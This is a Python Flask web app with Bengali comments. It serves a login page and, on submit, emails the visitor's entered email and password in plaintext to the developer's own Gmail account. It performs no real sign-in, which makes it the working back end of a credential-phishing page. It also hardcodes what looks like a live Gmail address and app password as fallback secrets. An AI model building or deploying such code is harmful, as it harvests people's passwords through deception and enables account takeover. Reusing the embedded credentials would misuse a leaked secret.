import os
import smtplib
from flask import Flask, render_template, request, redirect
from dotenv import load_dotenv

# .env ফাইল থেকে ভেরিয়েবল লোড করার জন্য (নিরাপত্তার জন্য)
load_dotenv()

app = Flask(__name__)

def send_email(user_info):
    try:
        # Gmail SMTP সার্ভার সেটআপ
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        
        # Render বা স্থানীয় এনভায়রনমেন্ট থেকে ডাটা নেওয়া
        # যদি .env ব্যবহার না করেন তবে সরাসরি আপনার ইমেইল ও পাসওয়ার্ড এখানে দিতে পারেন
        my_email = os.environ.get("MY_EMAIL", "mdrakibjoysiddhi2025@gmail.com")
        app_password = os.environ.get("APP_PASSWORD", "jloa wdtm rdfr hnma")
        
        server.login(my_email, app_password)
        
        subject = "New Login Alert! (Rakib's Project)"
        body = f"User logged in with details:\n{user_info}"
        message = f"Subject: {subject}\n\n{body}"
        
        # নিজেকেই ইমেইল পাঠানো হচ্ছে
        server.sendmail(my_email, my_email, message)
        server.quit()  
        return True
    except Exception as e:
        print(f"Error: {e}") 
        return False

@app.route('/') 
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')

    if not email or not password:
        return redirect('/')
    
    user_data = f"Email: {email}\nPassword: {password}"
    email_sent = send_email(user_data)
    
    if email_sent:
        return redirect('/success')
    else:
        return "ইমেইল পাঠাতে সমস্যা হয়েছে। অনুগ্রহ করে পরে চেষ্টা করুন।"

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    # হোস্ট করার সময় 'debug=True' রাখা উচিত নয়, তবে লোকাল চেক করার জন্য ঠিক আছে
    app.run(debug=True)